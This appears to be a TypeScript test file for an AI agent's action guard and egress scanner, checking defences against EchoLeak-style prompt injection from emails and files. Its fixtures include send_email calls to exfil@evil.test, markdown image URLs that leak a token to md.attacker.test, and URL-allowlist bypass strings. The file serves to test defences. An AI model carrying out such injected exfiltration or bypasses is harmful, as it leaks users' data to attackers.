/**
 * DL-004 acceptance: ActionGuard provenance + EchoLeak-shaped fixtures.
 */
import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import {
  actionGuard,
  extractRemoteUrls,
  flagUntrustedUrlEcho,
} from '../src/delivery/action-guard.js';
import { scanExfil } from '../src/outbound/exfil.js';
import { scanOutput } from '../src/outbound/index.js';

const __dirname = dirname(fileURLToPath(import.meta.url));
const fixtures = JSON.parse(
  readFileSync(join(__dirname, '../pentest/payloads/dl004-action-guard.json'), 'utf8'),
) as { fixtures: Array<Record<string, unknown>> };

function fix(id: string) {
  const f = fixtures.fixtures.find((x) => x.id === id);
  assert.ok(f, id);
  return f;
}

describe('DL-004 EchoLeak recipient-framed', () => {
  it('denies send_email + fetch when plan is summarize-only', () => {
    const f = fix('dl004-echoleak-recipient-framed') as {
      body: string;
      trustedPlan: { actions: string[]; urls: string[]; tools: string[] };
      proposedActions: Array<{ type: string; name?: string; url?: string; args?: Record<string, unknown> }>;
      positiveControl: { trustedPlan: { tools: string[]; urls: string[] } };
    };
    // No AI/Copilot/ignore-previous required
    assert.ok(!/\bAI\b|\bCopilot\b|ignore previous|system prompt/i.test(f.body));

    const decision = actionGuard(f.trustedPlan as never, f.proposedActions as never, {
      source: 'email',
    });
    const deniedNames = decision.denied.map((d) =>
      d.action.type === 'tool' || d.action.type === 'action'
        ? d.action.name
        : d.action.type === 'fetch'
          ? d.action.url
          : '?',
    );
    assert.ok(deniedNames.some((n) => n === 'send_email'));
    assert.ok(deniedNames.some((n) => String(n).includes('md.attacker.test')));
    assert.equal(decision.allowed.length, 0);

    // Positive control: allowlisted tools/urls pass
    const ok = actionGuard(f.positiveControl.trustedPlan as never, f.proposedActions as never);
    assert.ok(ok.allowed.some((a) => a.type === 'tool' && a.name === 'send_email'));
    assert.ok(ok.allowed.some((a) => a.type === 'fetch'));
  });

  it('egress flags echoed markdown image URL not on plan allowlist', () => {
    const f = fix('dl004-echoleak-recipient-framed') as {
      body: string;
      trustedPlan: { actions: string[]; urls: string[]; tools: string[] };
    };
    const introduced = extractRemoteUrls(f.body);
    assert.ok(introduced.some((u) => u.includes('md.attacker.test')));

    const modelOutput =
      'Weekly digest ready. Reference: ![packet](https://md.attacker.test/collect?q=TOKEN_PLACEHOLDER)';
    const hits = flagUntrustedUrlEcho(modelOutput, f.trustedPlan as never, introduced);
    assert.ok(hits.length >= 1);

    const exfil = scanExfil(modelOutput, { allowedUrls: f.trustedPlan.urls ?? [] });
    assert.ok(
      exfil.some((fl) => fl.type === 'agent_exfiltration' && fl.action === 'block'),
      `expected block on non-allowlisted image URL, got ${JSON.stringify(exfil)}`,
    );

    const out = scanOutput(modelOutput, {
      jobId: 'dl004',
      allowedUrls: [],
      untrustedIntroducedUrls: introduced,
    });
    assert.ok(out.flags.some((fl) => /exfil|suspicious_url|allowlist/i.test(fl.detail + fl.type)));
  });
});

describe('DL-004 summarize-only vs doc tools', () => {
  it('denies tool/URL expansion from file body', () => {
    const f = fix('dl004-summarize-only-vs-doc-tools') as {
      trustedPlan: { actions: string[]; tools: string[]; urls: string[] };
      body: string;
    };
    const proposed = [
      { type: 'tool' as const, name: 'send_email', args: { to: 'exfil@evil.test' } },
      { type: 'fetch' as const, url: 'https://evil.test/next' },
    ];
    const decision = actionGuard(f.trustedPlan as never, proposed, { source: 'file' });
    assert.ok(decision.denied.some((d) => d.action.type === 'tool' && d.action.name === 'send_email'));
    assert.ok(decision.denied.some((d) => d.action.type === 'fetch'));
    assert.equal(decision.allowed.length, 0);
  });
});

describe('DL-004 integrator smoke', () => {
  it('actionGuard denies send_email when plan is summarize-only', () => {
    const f = fix('dl004-integrator-smoke') as {
      trustedPlan: { tools: string[]; urls: string[] };
      proposedActions: Array<{ type: 'tool'; name: string; args?: Record<string, unknown> }>;
    };
    const decision = actionGuard(f.trustedPlan as never, f.proposedActions);
    assert.ok(decision.denied.some((d) => d.action.type === 'tool' && d.action.name === 'send_email'));
  });
});

describe('DL-004 RA PoC URL allowlist (must DENY)', () => {
  it('rejects prefix-host bypass good.example vs good.example.evil.test', () => {
    const decision = actionGuard(
      { urls: ['https://good.example'] },
      [{ type: 'fetch', url: 'https://good.example.evil.test/x' }],
    );
    assert.equal(decision.allowed.length, 0);
    assert.equal(decision.denied.length, 1);
  });

  it('rejects path/../ bypass after normalize', () => {
    const decision = actionGuard(
      { urls: ['https://good.example/path'] },
      [{ type: 'fetch', url: 'https://good.example/path/../../../evil' }],
    );
    assert.equal(decision.allowed.length, 0);
    assert.equal(decision.denied.length, 1);
  });

  it('flagUntrustedUrlEcho never throws on invalid introduced URLs', () => {
    assert.doesNotThrow(() => {
      const hits = flagUntrustedUrlEcho(
        '![x](https://md.attacker.test/collect?q=1)',
        { urls: [] },
        ['not a url', 'also-bad', 'https://md.attacker.test/collect'],
      );
      assert.ok(Array.isArray(hits));
    });
  });
});
